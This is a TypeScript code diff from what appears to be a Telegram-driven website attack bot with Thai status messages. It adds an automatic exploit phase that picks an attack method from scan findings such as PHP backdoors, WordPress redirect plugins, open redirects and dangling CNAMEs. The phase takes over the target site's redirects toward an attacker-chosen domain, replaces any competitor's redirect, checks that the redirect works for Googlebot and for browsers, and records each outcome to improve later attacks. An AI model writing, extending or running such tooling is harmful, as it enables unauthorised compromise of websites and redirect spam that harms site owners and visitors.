@@ -5319,6 +5319,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       hijack_engine: 2 * 60 * 1000,     // 2 min for hijack engine (reduced from 5)
       advanced_attack: 2 * 60 * 1000,   // 2 min for advanced techniques (reduced from 5)
       agentic_session: 4 * 60 * 1000,   // 4 min for AI session (reduced from 8)
+      auto_exploit: 3 * 60 * 1000,       // 3 min for auto-exploit after deep scan
     };
     const DEFAULT_STEP_TIMEOUT = 90 * 1000; // 1.5 min default (reduced from 3)
     
@@ -5640,6 +5641,307 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             stepIndex++;
           }
 
+          // ═══ Phase 5: AUTO-EXPLOIT — automatically attack based on scan findings ═══
+          const exploitableVulns = deepScanResult.vulnerabilities.filter((v: any) => v.exploitable);
+          const topStrategy = deepScanResult.topStrategy || (deepScanResult.strategies && deepScanResult.strategies.length > 0 ? deepScanResult.strategies[0] : null);
+          const hasExploitableFindings = exploitableVulns.length > 0 || (topStrategy && topStrategy.successProbability >= 30);
+
+          if (hasExploitableFindings) {
+            await narrator.startPhase("exploit", "🎯 Phase 5: Auto-Exploit");
+            const exploitStep = await narrator.addStep(
+              topStrategy
+                ? `Auto-exploit ด้วย ${topStrategy.name} (~${topStrategy.successProbability}%)`
+                : `Auto-exploit ${exploitableVulns.length} ช่องโหว่ที่พบ`
+            );
+            const exploitStart = Date.now();
+
+            // Determine best attack method from scan results
+            type AutoExploitMethod = "redirect_only" | "hijack_redirect" | "full_chain";
+            let autoExploitMethod: AutoExploitMethod = "redirect_only";
+            let autoExploitReason = "";
+
+            // Map vulnerability types to attack methods
+            const vulnTypes = new Set(exploitableVulns.map((v: any) => v.type));
+            const hasOpenRedirect = vulnTypes.has("open_redirect_param") || vulnTypes.has("open_redirect_path") || vulnTypes.has("login_redirect_abuse") || vulnTypes.has("oauth_redirect_abuse");
+            const hasPhpBackdoor = vulnTypes.has("php_code_injection") || vulnTypes.has("php_backdoor") || vulnTypes.has("php_cloaking");
+            const hasWpPlugin = vulnTypes.has("wp_redirect_plugin") || vulnTypes.has("wp_rest_redirect");
+            const hasServerConfig = vulnTypes.has("htaccess_redirect") || vulnTypes.has("webconfig_redirect") || vulnTypes.has("server_misconfiguration");
+            const hasDanglingCname = vulnTypes.has("dangling_cname") || vulnTypes.has("expired_domain_in_chain");
+            const hasContentInjection = vulnTypes.has("content_injection") || vulnTypes.has("header_redirect") || vulnTypes.has("meta_refresh_redirect") || vulnTypes.has("js_redirect");
+
+            // Strategy selection logic
+            if (hasPhpBackdoor || hasWpPlugin || hasServerConfig) {
+              // Direct file/config access — hijack_redirect is best
+              autoExploitMethod = "hijack_redirect";
+              autoExploitReason = hasPhpBackdoor ? "PHP backdoor/injection detected" : hasWpPlugin ? "WP redirect plugin accessible" : "Server config exploitable";
+            } else if (hasOpenRedirect) {
+              // Open redirect — redirect_only can exploit directly
+              autoExploitMethod = "redirect_only";
+              autoExploitReason = "Open redirect parameter found";
+            } else if (hasDanglingCname) {
+              // DNS takeover — full_chain for comprehensive approach
+              autoExploitMethod = "full_chain";
+              autoExploitReason = "Dangling CNAME/expired domain in chain";
+            } else if (hasContentInjection) {
+              // Content injection — hijack existing redirect
+              autoExploitMethod = "hijack_redirect";
+              autoExploitReason = "Existing redirect content can be hijacked";
+            } else if (topStrategy) {
+              // Use top strategy's required access to pick method
+              if (topStrategy.requiredAccess === "none" || topStrategy.requiredAccess === "low") {
+                autoExploitMethod = "redirect_only";
+              } else {
+                autoExploitMethod = "full_chain";
+              }
+              autoExploitReason = `Top strategy: ${topStrategy.name} (${topStrategy.requiredAccess} access)`;
+            } else {
+              autoExploitMethod = "full_chain";
+              autoExploitReason = `${exploitableVulns.length} exploitable vulns, using full chain`;
+            }
+
+            await narrator.addAnalysis(
+              `🎯 Auto-Exploit เริ่มทำงาน!\n` +
+              `วิธี: ${autoExploitMethod}\n` +
+              `เหตุผล: ${autoExploitReason}\n` +
+              `ช่องโหว่ที่ exploit ได้: ${exploitableVulns.length}` +
+              (topStrategy ? `\nTop strategy: ${topStrategy.name} (~${topStrategy.successProbability}%)` : "")
+            );
+
+            // Get redirect URL
+            let autoRedirectUrl: string;
+            try {
+              const { pickRedirectUrl } = await import("./agentic-attack-engine");
+              autoRedirectUrl = await pickRedirectUrl();
+            } catch {
+              autoRedirectUrl = "https://hkt956.org/";
+            }
+            await narrator.addStep(`Redirect URL: ${autoRedirectUrl.substring(0, 50)}`);
+
+            // Execute auto-exploit based on selected method
+            let autoExploitSuccess = false;
+            let autoExploitDetail = "";
+            let autoExploitUploadedUrl: string | undefined;
+
+            try {
+              if (autoExploitMethod === "redirect_only") {
+                // Direct redirect takeover
+                const exploitOutcome = await runStepWithTimeout("auto_exploit", narrator, async () => {
+                  const { executeRedirectTakeover } = await import("./redirect-takeover");
+                  return executeRedirectTakeover({
+                    targetUrl: effectiveTargetUrl,
+                    ourRedirectUrl: autoRedirectUrl,
+                    competitorRedirectUrl: deepScanResult.currentRedirectDestination || undefined,
+                    onProgress: (phase: string, detail: string) => {
+                      narrator.addAnalysis(`⚡ ${detail.substring(0, 70)}`).catch(() => {});
+                    },
+                  });
+                }, { heartbeatLabel: "Auto-Exploit (Redirect Takeover)" });
+
+                if (exploitOutcome.ok) {
+                  const results = exploitOutcome.result;
+                  const succeeded = results.filter((r: any) => r.success);
+                  autoExploitSuccess = succeeded.length > 0;
+                  autoExploitDetail = autoExploitSuccess
+                    ? `Redirect takeover สำเร็จด้วย ${succeeded.map((r: any) => r.method).join(", ")}`
+                    : `ลอง ${results.length} วิธี ไม่สำเร็จ`;
+                  autoExploitUploadedUrl = succeeded[0]?.injectedUrl;
+                } else {
+                  autoExploitDetail = exploitOutcome.timedOut ? "Auto-exploit หมดเวลา" : `Error: ${exploitOutcome.error.substring(0, 60)}`;
+                }
+
+              } else if (autoExploitMethod === "hijack_redirect") {
+                // Hijack existing redirect
+                const exploitOutcome = await runStepWithTimeout("auto_exploit", narrator, async () => {
+                  const { executeHijackRedirect } = await import("./hijack-redirect-engine");
+                  return executeHijackRedirect({
+                    targetDomain: domain,
+                    newRedirectUrl: autoRedirectUrl,
+                    originalRedirectUrl: deepScanResult.currentRedirectDestination || undefined,
+                  }, async (phase, detail) => {
+                    narrator.addAnalysis(`⚡ ${detail.substring(0, 70)}`).catch(() => {});
+                  });
+                }, { heartbeatLabel: "Auto-Exploit (Hijack Redirect)" });
+
+                if (exploitOutcome.ok) {
+                  const hijackResult = exploitOutcome.result;
+                  autoExploitSuccess = hijackResult.success;
+                  autoExploitDetail = autoExploitSuccess
+                    ? `Hijack สำเร็จด้วย ${hijackResult.winningMethod}`
+                    : `ลอง ${hijackResult.methodResults.length} วิธี ไม่สำเร็จ`;
+                } else {
+                  autoExploitDetail = exploitOutcome.timedOut ? "Auto-exploit หมดเวลา" : `Error: ${exploitOutcome.error.substring(0, 60)}`;
+                }
+
+              } else {
+                // Full chain — use unified pipeline
+                const exploitOutcome = await runStepWithTimeout("auto_exploit", narrator, async () => {
+                  const { executeRedirectTakeover } = await import("./redirect-takeover");
+                  return executeRedirectTakeover({
+                    targetUrl: effectiveTargetUrl,
+                    ourRedirectUrl: autoRedirectUrl,
+                    competitorRedirectUrl: deepScanResult.currentRedirectDestination || undefined,
+                    enableDestinationHijack: true,
+                    onProgress: (phase: string, detail: string) => {
+                      narrator.addAnalysis(`⚡ ${detail.substring(0, 70)}`).catch(() => {});
+                    },
+                  });
+                }, { heartbeatLabel: "Auto-Exploit (Full Chain)" });
+
+                if (exploitOutcome.ok) {
+                  const results = exploitOutcome.result;
+                  const succeeded = results.filter((r: any) => r.success);
+                  autoExploitSuccess = succeeded.length > 0;
+                  autoExploitDetail = autoExploitSuccess
+                    ? `Full chain สำเร็จด้วย ${succeeded.map((r: any) => r.method).join(", ")}`
+                    : `ลอง ${results.length} วิธี ไม่สำเร็จ`;
+                  autoExploitUploadedUrl = succeeded[0]?.injectedUrl;
+                } else {
+                  autoExploitDetail = exploitOutcome.timedOut ? "Auto-exploit หมดเวลา" : `Error: ${exploitOutcome.error.substring(0, 60)}`;
+                }
+              }
+            } catch (exploitErr: any) {
+              autoExploitDetail = `Auto-exploit error: ${exploitErr.message?.substring(0, 80)}`;
+            }
+
+            const exploitMs = Date.now() - exploitStart;
+            await narrator.updateStep(exploitStep, autoExploitSuccess ? "done" : "failed",
+              `${autoExploitDetail} (${(exploitMs / 1000).toFixed(1)}s)`, exploitMs
+            );
+            timings.push({ step: `Auto-Exploit (${autoExploitMethod})`, ms: exploitMs, ok: autoExploitSuccess });
+            stepIndex++;
+
+            // Phase 6: Path-aware redirect verification after exploit
+            if (autoExploitSuccess) {
+              await narrator.startPhase("verify", "✅ Phase 6: Redirect Verification");
+              const verifyStep = await narrator.addStep(`ตรวจสอบ redirect ที่ ${effectiveTargetUrl}`);
+              const verifyStart = Date.now();
+
+              try {
+                const redirectDomain = new URL(autoRedirectUrl).hostname;
+                const userAgents = [
+                  { name: "Desktop Chrome", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" },
+                  { name: "Googlebot", ua: "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" },
+                  { name: "Mobile", ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1" },
+                ];
+
+                let verifySuccess = false;
+                let verifyDetails: string[] = [];
+
+                for (const { name, ua } of userAgents) {
+                  try {
+                    const verifyUrl = effectiveTargetUrl;
+                    const resp = await fetch(verifyUrl, {
+                      headers: { "User-Agent": ua },
+                      redirect: "manual",
+                      signal: AbortSignal.timeout(10000),
+                    });
+
+                    const location = resp.headers.get("location") || "";
+                    const status = resp.status;
+                    const isRedirect = status >= 300 && status < 400;
+                    const matchesDest = location.includes(redirectDomain);
+
+                    if (isRedirect && matchesDest) {
+                      verifySuccess = true;
+                      verifyDetails.push(`${name}: ✅ ${status} → ${location.substring(0, 60)}`);
+                    } else if (isRedirect) {
+                      verifyDetails.push(`${name}: ⚠️ ${status} → ${location.substring(0, 60)} (ไม่ตรงเป้า)`);
+                    } else {
+                      // Check body for JS/meta redirect
+                      const body = await resp.text();
+                      if (body.includes(redirectDomain)) {
+                        verifySuccess = true;
+                        verifyDetails.push(`${name}: ✅ พบ redirect ใน body (status ${status})`);
+                      } else {
+                        verifyDetails.push(`${name}: ❌ ไม่พบ redirect (status ${status})`);
+                      }
+                    }
+                  } catch (uaErr: any) {
+                    verifyDetails.push(`${name}: ❌ Error: ${uaErr.message?.substring(0, 40)}`);
+                  }
+                }
+
+                const verifyMs = Date.now() - verifyStart;
+                await narrator.addAnalysis(verifyDetails.join("\n"));
+                await narrator.updateStep(verifyStep, verifySuccess ? "done" : "failed",
+                  verifySuccess ? `Redirect ทำงานสำเร็จ → ${autoRedirectUrl.substring(0, 50)}` : "Redirect ยังไม่ทำงาน",
+                  verifyMs
+                );
+                timings.push({ step: "Redirect Verification", ms: verifyMs, ok: verifySuccess });
+
+                // Update success status based on verification
+                if (!verifySuccess) {
+                  await narrator.addAnalysis("⚠️ Redirect ยังไม่ทำงานตามที่คาด — อาจต้องรอ propagation หรือลองวิธีอื่น");
+                }
+              } catch (verifyErr: any) {
+                await narrator.updateStep(verifyStep, "failed", `Verify error: ${verifyErr.message?.substring(0, 50)}`, Date.now() - verifyStart);
+              }
+              stepIndex++;
+            }
+
+            // Save auto-exploit log
+            await saveAttackLog({
+              targetDomain: domain,
+              method: `auto_exploit_${autoExploitMethod}`,
+              success: autoExploitSuccess,
+              durationMs: Date.now() - exploitStart,
+              redirectUrl: autoRedirectUrl,
+              uploadedUrl: autoExploitUploadedUrl,
+              aiReasoning: `Auto-exploit after deep scan: ${autoExploitMethod} — ${autoExploitDetail}. Reason: ${autoExploitReason}. Vulns: ${exploitableVulns.length}`,
+            });
+
+            // Attack success alert
+            if (autoExploitSuccess) {
+              sendAttackSuccessAlert({
+                domain,
+                method: `auto_exploit_${autoExploitMethod}`,
+                successMethod: autoExploitMethod,
+                redirectUrl: autoRedirectUrl,
+                uploadedUrl: autoExploitUploadedUrl,
+                verified: true,
+                durationMs: Date.now() - exploitStart,
+                details: `Auto-exploit after deep redirect scan: ${autoExploitDetail}`,
+              }).catch(err => console.warn(`[TelegramAI] Auto-exploit success alert failed: ${err}`));
+            }
+
+            // Record for adaptive learning
+            try {
+              const outcome: AttackOutcome = {
+                targetDomain: domain,
+                cms: null,
+                cmsVersion: null,
+                serverType: null,
+                phpVersion: null,
+                wafDetected: null,
+                wafStrength: null,
+                vulnScore: exploitableVulns.length > 0 ? Math.min(exploitableVulns.length * 20, 100) : null,
+                method: `auto_exploit_${autoExploitMethod}`,
+                exploitType: autoExploitReason,
+                payloadType: null,
+                wafBypassUsed: [],
+                payloadModifications: [],
+                attackPath: effectiveTargetUrl,
+                attemptNumber: 1,
+                isRetry: false,
+                previousMethodsTried: [],
+                success: autoExploitSuccess,
+                httpStatus: null,
+                errorCategory: autoExploitSuccess ? null : "auto_exploit_failed",
+                errorMessage: autoExploitSuccess ? null : autoExploitDetail,
+                filesPlaced: autoExploitSuccess ? 1 : 0,
+                redirectVerified: autoExploitSuccess,
+                durationMs: Date.now() - exploitStart,
+                aiFailureCategory: null,
+                aiReasoning: `Auto-exploit after deep scan: ${autoExploitReason}`,
+                aiConfidence: topStrategy ? topStrategy.successProbability : null,
+                aiEstimatedSuccess: topStrategy ? topStrategy.successProbability : null,
+                sessionId: null,
+                agenticSessionId: null,
+              };
+              await recordAttackOutcome(outcome);
+            } catch {}
+          }
+
         } else {
           const errMsg = scanOutcome.timedOut ? "⏰ Deep Redirect Scan หมดเวลา" : `Scan error: ${scanOutcome.error?.substring(0, 60)}`;
           await narrator.updateStep(scanStep, "failed", errMsg, Date.now() - scanStart);
@@ -5656,31 +5958,38 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       const vulnCount = deepScanResult?.vulnerabilities?.length || 0;
       const phpCount = deepScanResult?.phpCodeFindings?.length || 0;
       const stratCount = deepScanResult?.strategies?.length || 0;
+      // Check if auto-exploit was attempted and succeeded (look at timings)
+      const autoExploitTiming = timings.find(t => t.step.startsWith("Auto-Exploit"));
+      const autoExploitSucceeded = autoExploitTiming?.ok || false;
+      const overallSuccess = vulnCount > 0 || autoExploitSucceeded;
 
-      await narrator.complete(vulnCount > 0,
-        `Deep Redirect Scan เสร็จ (${(totalMs / 1000).toFixed(1)}s) | Vulns: ${vulnCount} | PHP: ${phpCount} | Strategies: ${stratCount}`
+      await narrator.complete(overallSuccess,
+        `Deep Redirect Scan + Auto-Exploit เสร็จ (${(totalMs / 1000).toFixed(1)}s) | Vulns: ${vulnCount} | PHP: ${phpCount} | Strategies: ${stratCount}` +
+        (autoExploitTiming ? ` | Auto-Exploit: ${autoExploitSucceeded ? "✅ สำเร็จ" : "❌ ไม่สำเร็จ"}` : "")
       );
 
       // Save log
       await saveAttackLog({
         targetDomain: domain,
         method: "deep_redirect_scan",
-        success: vulnCount > 0,
+        success: overallSuccess,
         durationMs: totalMs,
         aiReasoning: `Deep Redirect Scan: ${vulnCount} vulns, ${phpCount} PHP patterns, ${stratCount} strategies` +
-          (deepScanResult?.topStrategy ? ` | Top: ${deepScanResult.topStrategy.name} (~${deepScanResult.topStrategy.successProbability}%)` : ""),
+          (deepScanResult?.topStrategy ? ` | Top: ${deepScanResult.topStrategy.name} (~${deepScanResult.topStrategy.successProbability}%)` : "") +
+          (autoExploitTiming ? ` | Auto-Exploit: ${autoExploitSucceeded ? "SUCCESS" : "FAILED"}` : ""),
         preAnalysisData: deepScanResult ? {
           vulnerabilities: deepScanResult.vulnerabilities.slice(0, 10).map((v: any) => ({ type: v.type, severity: v.severity, location: v.location })),
           phpCodeFindings: deepScanResult.phpCodeFindings?.slice(0, 5).map((f: any) => ({ type: f.type, pattern: f.pattern })),
           strategies: deepScanResult.strategies?.slice(0, 3).map((s: any) => ({ name: s.name, prob: s.successProbability })),
           isRedirecting: deepScanResult.isCurrentlyRedirecting,
           redirectDest: deepScanResult.currentRedirectDestination,
+          autoExploit: autoExploitTiming ? { success: autoExploitSucceeded, method: autoExploitTiming.step } : null,
         } : null,
       });
 
       // Complete in registry
       clearTimeout(timeoutTimer);
-      completeRunningAttack(attackEntry.id, vulnCount > 0, totalMs);
+      completeRunningAttack(attackEntry.id, overallSuccess, totalMs);
       return;
 
     } else if (method === "redirect_only") {
